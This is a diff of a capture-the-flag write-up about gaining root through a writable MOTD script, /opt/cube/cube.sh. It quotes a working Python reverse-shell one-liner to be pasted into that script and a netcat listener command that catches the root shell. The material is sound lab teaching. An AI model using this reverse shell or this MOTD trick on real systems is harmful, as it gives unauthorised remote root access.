@@ -194,7 +194,7 @@ The one they expect you to be interested in is `/opt/cube/cube.sh`. This contain
 Well, it gives us the python code to execute a reverse shell:
 > python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-So yes, just copy and paste this into the `cube.sh` file.
+So yes, just copy and paste this into the `cube.sh` file. Make sure to replace `<IP>` with your actual IP, which the attack box has within the user's name. If you're still unsure, do a simple `ifconfig`.
 
 ![alt text](image-19.png)
 </details>
@@ -207,16 +207,17 @@ We actually don't need to do anything here. By going to `/etc/update-motd.d/` an
 
 This also brings to light how we may have known to look at `/opt/cube/cube.sh` from the earlier question. Essentially, we would look to find a privilege escalation vulnerability with the MOTD banner. I would argue this is a bit of a niche vulnerability for a CTF that requires almost no answers and practically gives you commands, so I leave this write-up in the perspective of you, the user, rather than just writing as if I knew perfectly how the CTF creator wanted this exercise to go.
 </details>
-<details>
-<summary> <b>Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!</b> </summary>
-
-Okay.
-</details>
 
 <details>
 <summary> <b>Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!</b> </summary>
 
-Here's the home run. If we did everything right, we should get a reverse shell from our netcat listener:
+Here's the home run. If we did everything right, we should get a reverse shell from our netcat listener upon a fresh SSH login:
+
+![alt text](image-21.png)
+
+![alt text](image-22.png)
+
+![alt text](image-23.png)
 
 Voila. I'll admit, I don't mind this hand holding bit, as it effectively walks you through how to make your own reverse shell.
 </details>
